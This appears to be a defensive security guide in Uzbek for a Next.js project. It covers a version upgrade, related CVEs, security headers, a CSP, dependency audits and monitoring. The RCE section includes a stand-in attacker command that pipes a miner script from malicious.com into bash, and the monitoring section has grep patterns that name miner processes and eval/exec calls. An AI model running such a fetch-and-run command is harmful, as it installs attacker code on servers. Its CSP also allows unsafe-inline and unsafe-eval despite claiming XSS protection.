# 🔒 Tikoncha Security Guide

## Xavfsizlik Yangilanishi - 2024

### Muhim Ma'lumot

Bu loyiha **Next.js 14.2.15** versiyasiga yangilandi. Oldingi 14.1.0 versiyasida quyidagi xavfsizlik muammolari mavjud edi:

| CVE            | Xavf darajasi | Tavsif                      |
| -------------- | ------------- | --------------------------- |
| CVE-2024-34350 | Yuqori        | Server Actions SSRF zaiflik |
| CVE-2024-34351 | O'rta         | Host header poisoning       |
| CVE-2024-39693 | Yuqori        | Authorization bypass        |

---

## 1. RCE (Remote Code Execution) Xavfi Tushuntirish

### Zaiflik qanday ishlaydi?

```
Hujumchi → Maxsus HTTP so'rov → Next.js Server → RCE
```

**Texnik tafsilotlar:**

1. **Server Actions Exploitation:**

    - Hujumchi maxsus tayyorlangan `__next_action` header yuboradi
    - Server bu ma'lumotni tekshirmasdan deserialize qiladi
    - Zararli payload server tomonida bajariladi

2. **RSC (React Server Components) Bypass:**

    - Client-side ma'lumotlar server componentlarga uzatiladi
    - Input validation yo'qligi tufayli kod injection mumkin

3. **Cryptomining hujumlari:**
    ```bash
    # Hujumchi serverni qo'lga kiritgandan so'ng:
    curl -s https://malicious.com/miner.sh | bash
    # CPU 100% ishlatib cryptocurrency mining
    ```

### Aniqlash belgilari:

-   **CPU** doimiy 80-100% ishlatilishi
-   **Noma'lum processlar:** `xmrig`, `minerd`, `cryptonight`
-   **Tashqi ulanishlar:** mining pool'larga (port 3333, 4444, 5555)

---

## 2. Qo'llangan Xavfsizlik Choralari

### HTTP Security Headers

| Header                      | Qiymat                   | Himoya         |
| --------------------------- | ------------------------ | -------------- |
| `X-Frame-Options`           | DENY                     | Clickjacking   |
| `X-Content-Type-Options`    | nosniff                  | MIME sniffing  |
| `X-XSS-Protection`          | 1; mode=block            | XSS            |
| `Strict-Transport-Security` | max-age=31536000         | HTTPS majburiy |
| `Content-Security-Policy`   | (quyida)                 | XSS, injection |
| `Permissions-Policy`        | camera=(), microphone=() | API cheklash   |

### Content Security Policy (CSP)

```
default-src 'self';
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.googletagmanager.com;
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
img-src 'self' data: blob: https: http:;
font-src 'self' https://fonts.gstatic.com data:;
connect-src 'self' https://www.google-analytics.com;
frame-ancestors 'none';
```

---

## 3. Dependency Security

### Muntazam tekshirish:

```bash
# Zaifliklarni tekshirish
npm audit

# Avtomatik tuzatish
npm audit fix

# Eskirgan paketlarni ko'rish
npm outdated

# Barcha xavfsizlik tekshiruvlari
npm run security-check
```

### Tavsiya etilgan amallar:

1. **Dependabot** yoki **Renovate** o'rnatish
2. **package-lock.json** ni git'ga qo'shish
3. Har hafta `npm audit` ishlatish

---

## 4. Production Deployment Checklist

### ✅ Majburiy:

-   [ ] HTTPS yoqilgan
-   [ ] Environment variables xavfsiz saqlangan
-   [ ] `NODE_ENV=production` o'rnatilgan
-   [ ] Debug rejimi o'chirilgan
-   [ ] Source maps production'da yo'q

### ✅ Tavsiya etilgan:

-   [ ] Rate limiting o'rnatilgan
-   [ ] WAF (Web Application Firewall) ishlatilmoqda
-   [ ] Logging va monitoring faol
-   [ ] Backup strategiyasi mavjud

---

## 5. Monitoring va Aniqlash

### CPU/Memory monitoring:

```bash
# Linux/Mac
top -o cpu

# Suspicious processes
ps aux | grep -E "(xmrig|miner|crypto)"

# Network connections
netstat -an | grep -E "(3333|4444|5555)"
```

### Log monitoring:

```bash
# Suspicious requests
grep -E "(eval|exec|spawn|child_process)" /var/log/nginx/access.log
```

---

## 6. Aloqa

Xavfsizlik muammolarini topganingizda:

-   Email: security@tikoncha.uz
-   Responsible disclosure qoidalariga amal qiling

---

_Oxirgi yangilanish: 2024-12-09_
